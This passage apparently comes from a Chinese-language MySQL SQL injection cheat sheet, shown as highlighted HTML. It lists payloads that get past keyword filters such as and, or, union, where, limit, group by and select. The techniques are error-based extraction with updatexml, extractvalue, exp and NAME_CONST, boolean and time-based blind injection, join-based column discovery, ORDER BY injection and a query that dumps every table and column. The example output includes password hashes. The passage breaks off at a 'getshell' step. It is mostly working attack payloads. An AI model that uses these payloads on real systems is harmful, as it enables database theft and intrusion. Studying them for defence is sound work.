+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">multipolygon</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">@@</span><span class="n">datadir</span><span class="p">)</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">));</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>ERROR 1367 (22007): Illegal non geometric &lsquo;(select <code>b</code>.<code>@@datadir</code> from (select &lsquo;/var/lib/mysql/&rsquo; AS <code>@@datadir</code> from dual) <code>b</code>)&rsquo; value found during parsing</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">()</span> <span class="p">)</span> <span class="n">a</span><span class="p">)</span> <span class="p">);</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>ERROR 1690 (22003): DOUBLE value is out of range in &lsquo;exp(~((select &lsquo;root@localhost&rsquo; from dual)))&rsquo;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span>  <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="n">NAME_CONST</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">),</span><span class="n">NAME_CONST</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">))</span><span class="n">x</span><span class="p">;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>ERROR 1060 (42S21): Duplicate column name &lsquo;5.5.44-0ubuntu0.14.04.1&rsquo;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="n">concat</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">group</span> <span class="k">by</span> <span class="n">x</span><span class="p">)</span><span class="n">a</span><span class="p">);</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>ERROR 1062 (23000): Duplicate entry &lsquo;5.5.44-0ubuntu0.14.04.11&rsquo; for key &lsquo;group_key&rsquo;</code></p>
+
+<h3 id="15-组合过滤之-preg-match-and-or-union-where-i-id">15.组合过滤之 <code>preg_match('/(and|or|union|where)/i',$id)</code></h3>
+
+<p>上面基本介绍过了.大家都懂</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="mi">1</span> <span class="o">||</span> <span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span> <span class="c1">-- 超过长度可以配合substr
+</span><span class="c1"></span><span class="mi">1</span> <span class="o">%</span><span class="mi">26</span><span class="o">%</span><span class="mi">26</span> <span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span>
+<span class="mi">1</span> <span class="o">||</span> <span class="p">(</span><span class="k">select</span> <span class="k">user</span> <span class="k">from</span> <span class="n">users</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
+<span class="mi">1</span> <span class="o">%</span><span class="mi">26</span><span class="o">%</span><span class="mi">26</span> <span class="k">if</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">115</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span>
+<span class="mi">1</span> <span class="o">||</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">115</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="16-组合过滤之-preg-match-and-or-union-where-limit-i-id">16.组合过滤之 <code>preg_match('/(and|or|union|where|limit)/i', $id)</code></h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">2</span> <span class="o">||</span> <span class="p">(</span><span class="k">select</span> <span class="n">username</span> <span class="k">from</span> <span class="n">test</span> <span class="k">group</span> <span class="k">by</span> <span class="n">id</span> <span class="k">having</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">2</span>  <span class="o">|</span> <span class="n">root</span>     <span class="o">|</span> <span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">3</span>  <span class="o">|</span> <span class="n">test</span>     <span class="o">|</span> <span class="mi">098</span><span class="n">f6bcd4621d373cade4e832627b4f6</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">4</span>  <span class="o">|</span> <span class="n">testtest</span> <span class="o">|</span> <span class="mi">05</span><span class="n">a671c66aefea124cc08b76ea6d30bb</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span>
+<span class="err">报错注入或者盲注</span><span class="p">,</span><span class="err">最主要就是解决</span><span class="n">limit的问题</span><span class="p">.</span><span class="err">用</span><span class="n">having代替即可</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="17-组合过滤之-preg-match-and-or-union-where-limit-group-by-i-id">17.组合过滤之 <code>preg_match('/(and|or|union|where|limit|group by)/i', $id)</code></h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">2</span> <span class="o">||</span> <span class="p">(</span><span class="k">select</span> <span class="n">substr</span><span class="p">(</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span> <span class="k">from</span> <span class="n">test</span><span class="p">)</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">2</span>  <span class="o">|</span> <span class="n">root</span>     <span class="o">|</span> <span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">3</span>  <span class="o">|</span> <span class="n">test</span>     <span class="o">|</span> <span class="mi">098</span><span class="n">f6bcd4621d373cade4e832627b4f6</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">4</span>  <span class="o">|</span> <span class="n">testtest</span> <span class="o">|</span> <span class="mi">05</span><span class="n">a671c66aefea124cc08b76ea6d30bb</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="18-组合过滤之-preg-match-and-or-union-where-limit-group-by-select-i-id">18.组合过滤之 <code>preg_match('/(and|or|union|where|limit|group by|select)/i', $id)</code></h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">test</span><span class="o">`</span> <span class="k">where</span> <span class="n">id</span><span class="o">=-</span><span class="mi">2</span> <span class="o">||</span> <span class="n">substr</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x61646d696e</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+
+</span><span class="c1"></span><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span></code></pre></td></tr></table>
+</div>
+</div>
+<hr />
+
+<p><center>更新分割线</center></p>
+
+<hr />
+
+<h3 id="19-过滤-column">19.过滤 column</h3>
+
+<p>知道表名的前提下join报错爆字段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="n">a</span> <span class="k">join</span> <span class="n">users</span> <span class="n">b</span><span class="p">)</span> <span class="k">c</span><span class="p">);</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>ERROR 1060 (42S21): Duplicate column name &lsquo;id&rsquo;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="n">a</span> <span class="k">join</span> <span class="n">users</span> <span class="n">b</span> <span class="k">using</span><span class="p">(</span><span class="n">id</span><span class="p">))</span> <span class="k">c</span><span class="p">);</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>ERROR 1060 (42S21): Duplicate column name &lsquo;username&rsquo;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="n">a</span> <span class="k">join</span> <span class="n">users</span> <span class="n">b</span> <span class="k">using</span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="n">username</span><span class="p">))</span> <span class="k">c</span><span class="p">);</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>ERROR 1060 (42S21): Duplicate column name &lsquo;password&rsquo;</code></p>
+
+<h3 id="20-order-by-注入">20.order by 注入</h3>
+
+<p>基于报错</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">order</span> <span class="k">by</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="n">rand</span><span class="p">(</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">));</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>ERROR 1105 (HY000): XPATH syntax error: &lsquo;~test~&rsquo;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">order</span> <span class="k">by</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>ERROR 1105 (HY000): XPATH syntax error: &lsquo;~test~&rsquo;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="err">基于返回信息不同</span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">order</span> <span class="k">by</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+-----------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span> <span class="n">address</span>   <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+-----------+
+</span><span class="c1"></span><span class="o">|</span>  <span class="mi">2</span> <span class="o">|</span> <span class="n">root</span>     <span class="o">|</span> <span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span> <span class="o">|</span> <span class="n">baidu</span><span class="p">.</span><span class="n">com</span> <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">3</span> <span class="o">|</span> <span class="n">test</span>     <span class="o">|</span> <span class="mi">098</span><span class="n">f6bcd4621d373cade4e832627b4f6</span> <span class="o">|</span> <span class="mi">7</span><span class="n">xz</span><span class="p">.</span><span class="n">cc</span>    <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">4</span> <span class="o">|</span> <span class="n">testtest</span> <span class="o">|</span> <span class="mi">05</span><span class="n">a671c66aefea124cc08b76ea6d30bb</span> <span class="o">|</span> <span class="mi">04</span><span class="n">z</span><span class="p">.</span><span class="n">net</span>   <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span> <span class="n">localhost</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+-----------+
+</span><span class="c1"></span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">order</span> <span class="k">by</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&lt;</span><span class="mi">1</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+-----------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span> <span class="n">address</span>   <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+-----------+
+</span><span class="c1"></span><span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span> <span class="n">localhost</span> <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">2</span> <span class="o">|</span> <span class="n">root</span>     <span class="o">|</span> <span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span> <span class="o">|</span> <span class="n">baidu</span><span class="p">.</span><span class="n">com</span> <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">3</span> <span class="o">|</span> <span class="n">test</span>     <span class="o">|</span> <span class="mi">098</span><span class="n">f6bcd4621d373cade4e832627b4f6</span> <span class="o">|</span> <span class="mi">7</span><span class="n">xz</span><span class="p">.</span><span class="n">cc</span>    <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">4</span> <span class="o">|</span> <span class="n">testtest</span> <span class="o">|</span> <span class="mi">05</span><span class="n">a671c66aefea124cc08b76ea6d30bb</span> <span class="o">|</span> <span class="mi">04</span><span class="n">z</span><span class="p">.</span><span class="n">net</span>   <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+-----------+
+</span><span class="c1"></span>
+<span class="err">基于时间</span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">order</span> <span class="k">by</span><span class="o">`</span><span class="n">id</span><span class="o">`=</span><span class="mi">1</span> <span class="k">and</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+-----------+
+</span><span class="c1"></span><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span> <span class="n">address</span>   <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+-----------+
+</span><span class="c1"></span><span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">21232</span><span class="n">f297a57a5a743894a0e4a801fc3</span> <span class="o">|</span> <span class="n">localhost</span> <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">2</span> <span class="o">|</span> <span class="n">root</span>     <span class="o">|</span> <span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span> <span class="o">|</span> <span class="n">baidu</span><span class="p">.</span><span class="n">com</span> <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">3</span> <span class="o">|</span> <span class="n">test</span>     <span class="o">|</span> <span class="mi">098</span><span class="n">f6bcd4621d373cade4e832627b4f6</span> <span class="o">|</span> <span class="mi">7</span><span class="n">xz</span><span class="p">.</span><span class="n">cc</span>    <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">4</span> <span class="o">|</span> <span class="n">testtest</span> <span class="o">|</span> <span class="mi">05</span><span class="n">a671c66aefea124cc08b76ea6d30bb</span> <span class="o">|</span> <span class="mi">04</span><span class="n">z</span><span class="p">.</span><span class="n">net</span>   <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+-----------+
+</span><span class="c1"></span><span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">2</span><span class="p">.</span><span class="mi">01</span> <span class="n">sec</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="tips">tips</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">&#39;=&#39; &lt;--&gt; &#39;like&#39; &lt;--&gt; &#39;in&#39; --&gt; &#39;regexp&#39; &lt;--&gt; &#39;rlike&#39; --&gt; &#39;&gt;&#39; &lt;--&gt; &#39;&lt;&#39;</pre></td></tr></table>
+</div>
+</div>
+<h3 id="1-爆所有表列">1.爆所有表列</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">(SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,&#39; [ &#39;,table_schema,&#39; ] &gt;&#39;,table_name,&#39; &gt; &#39;,column_name))))x)</pre></td></tr></table>
+</div>
+</div>
+<h3 id="2-利用报错发现库表列">2.利用报错发现库表列</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql">    <span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="k">where</span><span class="o">`</span><span class="n">username</span><span class="o">`=</span><span class="s1">&#39;admin&#39;</span> <span class="k">and</span> <span class="n">polygon</span><span class="p">(</span><span class="n">username</span><span class="p">);</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>(1367, u&rdquo;Illegal non geometric &lsquo;<code>test</code>.<code>users</code>.<code>username</code>&rsquo; value found during parsing&rdquo;)</code></p>
+
+<h3 id="3-getshell">3.getshell</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">show</span> <span class="n">variables</span> <span class="k">like</span> <span class="s1">&#39;%plugin%&#39;</span><span class="p">;</span>
